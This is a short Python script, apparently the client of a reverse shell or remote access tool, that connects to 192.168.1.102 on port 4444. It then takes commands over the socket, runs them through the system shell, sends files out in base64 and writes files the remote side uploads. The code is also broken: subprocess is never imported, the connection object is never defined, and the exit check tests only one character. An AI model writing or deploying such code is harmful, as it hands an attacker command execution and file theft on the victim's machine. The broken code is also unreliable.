import json
import socket
import os
import base64
import server

def send(data):
    json_data = json.dumps(data)
    connection.send(json_data.encode('utf-8'))

def recieve():
    json_data = ""
    while True:
        try:
            json_data += connection.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def run():
    while True:
        command = recieve()
        if command[0] == "exit":
            break
        elif command[:2] == 'cd' and len(command) > 1:
            os.chdir(command[3:])
        elif command[:8] == 'download':
            with open(command[9:], 'rb') as file:
                send(base64.b64encode(file.read()).decode('utf-8'))
        elif command[:6] == 'upload':
            with open(command[7:], 'wb') as file:
                file_data = recieve()
                file.write(base64.b64decode(file_data))
        else:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            result = process.stdout.read() + process.stderr.read()
            send(result)
        
server('192.168.1.102', 4444)
run()
